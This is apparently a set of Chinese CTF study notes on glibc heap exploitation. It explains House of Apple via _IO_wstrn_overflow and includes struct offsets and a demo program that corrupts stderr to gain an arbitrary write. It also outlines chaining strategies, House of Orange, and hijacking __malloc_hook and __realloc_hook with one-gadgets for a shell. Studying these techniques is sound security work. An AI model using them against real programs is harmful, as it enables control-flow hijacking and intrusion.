使用 `largebin attack` 可以劫持`_IO_list_all` 变量，将其替换为伪造的 `IO_FILE` 结构体，而在此时，我们其实仍可以继续利用某些 `IO` 流函数去修改其他地方的值。要想修改其他地方的值，就离不开`_IO_FILE` 的一个成员`_wide_data` 的利用。
```c
struct _IO_FILE_complete
{
  struct _IO_FILE _file;
  __off64_t _offset;
  /* Wide character stream stuff.  */
  struct _IO_codecvt *_codecvt;
  struct _IO_wide_data *_wide_data; // 劫持这个变量
  struct _IO_FILE *_freeres_list;
  void *_freeres_buf;
  size_t __pad5;
  int _mode;
  /* Make sure we don't get into trouble again.  */
  char _unused2[15 * sizeof (int) - 4 * sizeof (void *) - sizeof (size_t)];
};
```
`amd64` 程序下，`struct _IO_wide_data *_wide_data` 在`_IO_FILE` 中的偏移为 `0xa0`：
```
amd64：

0x0:'_flags',
0x8:'_IO_read_ptr',
0x10:'_IO_read_end',
0x18:'_IO_read_base',
0x20:'_IO_write_base',
0x28:'_IO_write_ptr',
0x30:'_IO_write_end',
0x38:'_IO_buf_base',
0x40:'_IO_buf_end',
0x48:'_IO_save_base',
0x50:'_IO_backup_base',
0x58:'_IO_save_end',
0x60:'_markers',
0x68:'_chain',
0x70:'_fileno',
0x74:'_flags2',
0x78:'_old_offset',
0x80:'_cur_column',
0x82:'_vtable_offset',
0x83:'_shortbuf',
0x88:'_lock',
0x90:'_offset',
0x98:'_codecvt',
0xa0:'_wide_data',
0xa8:'_freeres_list',
0xb0:'_freeres_buf',
0xb8:'__pad5',
0xc0:'_mode',
0xc4:'_unused2',
0xd8:'vtable'
```
我们在伪造`_IO_FILE` 结构体的时候，伪造`_wide_data` 变量，然后通过某些函数，比如`_IO_wstrn_overflow` 就可以将已知地址空间上的某些值修改为一个已知值。
```c
static wint_t
_IO_wstrn_overflow (FILE *fp, wint_t c)
{
  /* When we come to here this means the user supplied buffer is
     filled.  But since we must return the number of characters which
     would have been written in total we must provide a buffer for
     further use.  We can do this by writing on and on in the overflow
     buffer in the _IO_wstrnfile structure.  */
  _IO_wstrnfile *snf = (_IO_wstrnfile *) fp;

  if (fp->_wide_data->_IO_buf_base != snf->overflow_buf)
    {
      _IO_wsetb (fp, snf->overflow_buf,
		 snf->overflow_buf + (sizeof (snf->overflow_buf)
				      / sizeof (wchar_t)), 0);

      fp->_wide_data->_IO_write_base = snf->overflow_buf;
      fp->_wide_data->_IO_read_base = snf->overflow_buf;
      fp->_wide_data->_IO_read_ptr = snf->overflow_buf;
      fp->_wide_data->_IO_read_end = (snf->overflow_buf
				      + (sizeof (snf->overflow_buf)
					 / sizeof (wchar_t)));
    }

  fp->_wide_data->_IO_write_ptr = snf->overflow_buf;
  fp->_wide_data->_IO_write_end = snf->overflow_buf;

  /* Since we are not really interested in storing the characters
     which do not fit in the buffer we simply ignore it.  */
  return c;
}
```
分析一下这个函数，首先将 `fp` 强转为`_IO_wstrnfile *` 指针，然后判断 `fp->_wide_data->_IO_buf_base != snf->overflow_buf` 是否成立（一般肯定是成立的），如果成立则会对 `fp->_wide_data` 的`_IO_write_base`、`_IO_read_base`、`_IO_read_ptr` 和`_IO_read_end` 赋值为 `snf->overflow_buf` 或者与该地址一定范围内偏移的值；最后对 `fp->_wide_data` 的`_IO_write_ptr` 和`_IO_write_end` 赋值。

==也就是说，只要控制了 `fp->_wide_data`，就可以控制从 `fp->_wide_data` 开始一定范围内的内存的值，也就等同于**任意地址写已知地址**。==
这里有时候需要绕过`_IO_wsetb` 函数里面的 `free`：
```c
void
_IO_wsetb (FILE *f, wchar_t *b, wchar_t *eb, int a)
{
  if (f->_wide_data->_IO_buf_base && !(f->_flags2 & _IO_FLAGS2_USER_WBUF))
    free (f->_wide_data->_IO_buf_base); // 其不为0的时候不要执行到这里
  f->_wide_data->_IO_buf_base = b;
  f->_wide_data->_IO_buf_end = eb;
  if (a)
    f->_flags2 &= ~_IO_FLAGS2_USER_WBUF;
  else
    f->_flags2 |= _IO_FLAGS2_USER_WBUF;
}
```
`_IO_wstrnfile` 涉及到的结构体如下：
```c
struct _IO_str_fields
{
  _IO_alloc_type _allocate_buffer_unused;
  _IO_free_type _free_buffer_unused;
};

struct _IO_streambuf
{
  FILE _f;
  const struct _IO_jump_t *vtable;
};

typedef struct _IO_strfile_
{
  struct _IO_streambuf _sbf;
  struct _IO_str_fields _s;
} _IO_strfile;

typedef struct
{
  _IO_strfile f;
  /* This is used for the characters which do not fit in the buffer
     provided by the user.  */
  char overflow_buf[64];
} _IO_strnfile;


typedef struct
{
  _IO_strfile f;
  /* This is used for the characters which do not fit in the buffer
     provided by the user.  */
  wchar_t overflow_buf[64]; // overflow_buf在这里********
} _IO_wstrnfile;
```
其中，`overflow_buf` 相对于`_IO_FILE` 结构体的偏移为 `0xf0`，在 `vtable` 后面。
而 `struct _IO_wide_data` 结构体如下：
```c
struct _IO_wide_data
{
  wchar_t *_IO_read_ptr;	/* Current read pointer */
  wchar_t *_IO_read_end;	/* End of get area. */
  wchar_t *_IO_read_base;	/* Start of putback+get area. */
  wchar_t *_IO_write_base;	/* Start of put area. */
  wchar_t *_IO_write_ptr;	/* Current put pointer. */
  wchar_t *_IO_write_end;	/* End of put area. */
  wchar_t *_IO_buf_base;	/* Start of reserve area. */
  wchar_t *_IO_buf_end;		/* End of reserve area. */
  /* The following fields are used to support backing up and undo. */
  wchar_t *_IO_save_base;	/* Pointer to start of non-current get area. */
  wchar_t *_IO_backup_base;	/* Pointer to first valid character of
				   backup area */
  wchar_t *_IO_save_end;	/* Pointer to end of non-current get area. */

  __mbstate_t _IO_state;
  __mbstate_t _IO_last_state;
  struct _IO_codecvt _codecvt;
  wchar_t _shortbuf[1];
  const struct _IO_jump_t *_wide_vtable;
};
```
==换而言之，假如此时在堆上伪造一个 `_IO_FILE` 结构体并已知其地址为 `A`，将 `A + 0xd8` 替换为 `_IO_wstrn_jumps` 地址，`A + 0xa0` 设置为 `B`，并设置其他成员以便能调用到 `_IO_OVERFLOW`。`exit` 函数则会一路调用到 `_IO_wstrn_overflow` 函数，并将 `B` 至 `B + 0x38` 的地址区域的内容都替换为 `A + 0xf0` 或者 `A + 0x1f0`。==

简单写一个 `demo` 程序进行验证：
```c
#include<stdio.h>
#include<stdlib.h>
#include<stdint.h>
#include<unistd.h>
#include <string.h>

void main()
{
    setbuf(stdout, 0);
    setbuf(stdin, 0);
    setvbuf(stderr, 0, 2, 0);
    puts("[*] allocate a 0x100 chunk");
    size_t *p1 = malloc(0xf0);
    size_t *tmp = p1;
    size_t old_value = 0x1122334455667788;
    for (size_t i = 0; i < 0x100 / 8; i++)
    {
        p1[i] = old_value;
    }
    puts("===========================old value=======================");
    for (size_t i = 0; i < 4; i++)
    {
        printf("[%p]: 0x%016lx  0x%016lx\n", tmp, tmp[0], tmp[1]);
        tmp += 2;
    }
    puts("===========================old value=======================");

    size_t puts_addr = (size_t)&puts;
    printf("[*] puts address: %p\n", (void *)puts_addr);
    size_t stderr_write_ptr_addr = puts_addr + 0x1997b8;
    printf("[*] stderr->_IO_write_ptr address: %p\n", (void *)stderr_write_ptr_addr);
    size_t stderr_flags2_addr = puts_addr + 0x199804;
    printf("[*] stderr->_flags2 address: %p\n", (void *)stderr_flags2_addr);
    size_t stderr_wide_data_addr = puts_addr + 0x199830;
    printf("[*] stderr->_wide_data address: %p\n", (void *)stderr_wide_data_addr);
    size_t sdterr_vtable_addr = puts_addr + 0x199868;
    printf("[*] stderr->vtable address: %p\n", (void *)sdterr_vtable_addr);
    size_t _IO_wstrn_jumps_addr = puts_addr + 0x194ed0;
    printf("[*] _IO_wstrn_jumps address: %p\n", (void *)_IO_wstrn_jumps_addr);

    puts("[+] step 1: change stderr->_IO_write_ptr to -1");
    *(size_t *)stderr_write_ptr_addr = (size_t)-1;

    puts("[+] step 2: change stderr->_flags2 to 8");
    *(size_t *)stderr_flags2_addr = 8;

    puts("[+] step 3: replace stderr->_wide_data with the allocated chunk");
    *(size_t *)stderr_wide_data_addr = (size_t)p1;

    puts("[+] step 4: replace stderr->vtable with _IO_wstrn_jumps");
    *(size_t *)sdterr_vtable_addr = (size_t)_IO_wstrn_jumps_addr;

    puts("[+] step 5: call fcloseall and trigger house of apple");
    fcloseall();
    tmp = p1;
    puts("===========================new value=======================");
    for (size_t i = 0; i < 4; i++)
    {
        printf("[%p]: 0x%016lx  0x%016lx\n", tmp, tmp[0], tmp[1]);
        tmp += 2;
    }
    puts("===========================new value=======================");
}
```
输出结果如下：

#### 利用思路
从上面的分析可以，在只给了 `1` 次 `largebin attack` 的前提下，能利用`_IO_wstrn_overflow` 函数将任意地址空间上的值修改为一个已知地址，并且这个已知地址通常为堆地址。那么，当我们伪造两个甚至多个`_IO_FILE` 结构体，并将这些结构体通过 `chain` 字段串联起来就能进行组合利用。基于此，我总结了 `house of apple` 下至少四种利用思路。
##### 思路一：修改 `tcache` 线程变量
该思路需要借助 `house of pig` 的思想，利用`_IO_str_overflow` 中的 `malloc` 进行任意地址分配，`memcpy` 进行任意地址覆盖。其代码片段如下：
```c
int
_IO_str_overflow (FILE *fp, int c)
{
  	  // ......
	  char *new_buf;
	  char *old_buf = fp->_IO_buf_base; // 赋值为old_buf
	  size_t old_blen = _IO_blen (fp);
	  size_t new_size = 2 * old_blen + 100;
	  if (new_size < old_blen)
	    return EOF;
	  new_buf = malloc (new_size); // 这里任意地址分配
	  if (new_buf == NULL)
	    {
	      /*	  __ferror(fp) = 1; */
	      return EOF;
	    }
	  if (old_buf)
	    {
	      memcpy (new_buf, old_buf, old_blen); // 劫持_IO_buf_base后即可任意地址写任意值
	      free (old_buf);
      // .......
  }
```
利用步骤如下：
- 伪造至少两个`_IO_FILE` 结构体
- 第一个`_IO_FILE` 结构体执行`_IO_OVERFLOW` 的时候，利用`_IO_wstrn_overflow` 函数修改 `tcache` 全局变量为已知值，也就控制了 `tcache bin` 的分配
- 第二个`_IO_FILE` 结构体执行`_IO_OVERFLOW` 的时候，利用`_IO_str_overflow` 中的 `malloc` 函数任意地址分配，并使用 `memcpy` 使得能够**任意地址写任意值**
- 利用两次任意地址写任意值修改 `pointer_guard` 和 `IO_accept_foreign_vtables` 的值绕过`_IO_vtable_check` 函数的检测（或者利用一次任意地址写任意值修改 `libc.got` 里面的函数地址，很多 `IO` 流函数调用 `strlen/strcpy/memcpy/memset` 等都会调到 `libc.got` 里面的函数）
- 利用一个`_IO_FILE`，随意伪造 `vtable` 劫持程序控制流即可
因为可以已经任意地址写任意值了，所以这可以控制的变量和结构体非常多，也非常地灵活，需要结合具体的题目进行利用，比如题目中`_IO_xxx_jumps` 映射的地址空间可写的话直接修改其函数指针即可。
##### 思路二：修改 `mp_`结构体
该思路与上述思路差不多，不过对 `tcachebin` 分配的劫持是通过修改 `mp_.tcache_bins` 这个变量。打这个结构体的好处是在攻击远程时不需要爆破地址，因为线程全局变量、`tls` 结构体的地址本地和远程并不一定是一样的，有时需要爆破。
利用步骤如下：
- 伪造至少两个`_IO_FILE` 结构体
- 第一个`_IO_FILE` 结构体执行`_IO_OVERFLOW` 的时候，利用`_IO_wstrn_overflow` 函数修改 `mp_.tcache_bins` 为很大的值，使得很大的 `chunk` 也通过 `tcachebin` 去管理
- 接下来的过程与上面的思路是一样的
##### 思路三：修改 `pointer_guard` 线程变量之 `house of emma`
该思路其实就是 `house of apple + house of emma`。
利用步骤如下：
- 伪造两个`_IO_FILE` 结构体
- 第一个`_IO_FILE` 结构体执行`_IO_OVERFLOW` 的时候，利用`_IO_wstrn_overflow` 函数修改 `tls` 结构体 `pointer_guard` 的值为已知值
- 第二个`_IO_FILE` 结构体用来做 `house of emma` 利用即可控制程序执行流
##### 思路四：修改 `global_max_fast` 全局变量
这个思路也很灵活，修改掉这个变量后，直接释放超大的 `chunk`，去覆盖掉 `point_guard` 或者 `tcache` 变量。我称之为 `house of apple + house of corrision`。
利用过程与前面也基本是大同小异，就不在此详述了。
其实也有其他的思路，比如还可以劫持 `main_arena`，不过这个结构体利用起来会更复杂，所需要的空间将更大。而在上述思路的利用过程中，可以选择错位构造`_IO_FILE` 结构体，只需要保证关键字段满足要求即可，这样可以更加节省空间。
例题详见轩辕杯
### House of Orange
 libc2.23->libc2.26
在题目中没用free类型的操作时利用。House of orange 核心就是通过漏洞利用获得free的效果。
具体利用方法，改小 top chunk 的值，然后再申请一个大于该值的堆块，
如下图
![[Pasted image 20250531111354.png]]
![[Pasted image 20250531111401.png]]
原先的 top chunk 是0x20ee1,现在将他修改为0xee1，
**这里修改的大小要注意伪造的size要对齐到内存页，简单来说和原本 size 的后三位一样即可。**
然后我们申请一个 0xf00大小的 chunk
![[Pasted image 20250531111707.png]]
可以看到原先 top chunk 的位置已经成为了一个 unsorted bin ，然后再申请一个小于这个 size 的 chunk 即可切割这个 unsorted bin
![[Pasted image 20250531112113.png]]
可以看到切割下来的 chunk 里可以泄漏出libc基址和heap的基址，之后的内容就需要结合IOFile来做。
## Hook
### realloc_hook
 `__realloc_hook` 和`__malloc_hook`一样，在不为空时会跳转执行 hook 中的函数。
realloc 在库中的作用是重新调整 malloc 和 calloc 所分配的堆大小
![[Pasted image 20250505102515.png]]
![[Pasted image 20250505102543.png]]
标记处就是将rax设置为`__realloc_hook`的值然后跳转到`__realloc_hook`。
`__realloc_hook` 一般的作用就是调整栈帧，一般劫持`__malloc_hook`为 ogg 时不一定就刚好符合条件，这时候可以将`__malloc_hook`设置为 realloc，`__realloc_hook`设置为ogg，慢慢调 realloc 的偏移可以调整栈帧来满足 ogg 的条件。
### malloc_hook (2.34之前）
`__malloc_hook` 相当于给 malloc 函数套了一层外壳，在其不为空的时候在调用 malloc 时会知道hook所指向的函数，一般可以劫持 `__malloc_hook`为 ogg 来 get shell。
在`__malloc_hook - 0x23`的位置一般可以利用 double free 来劫持 `__malloc_hook` 。
![[Pasted image 20250427152448.png]]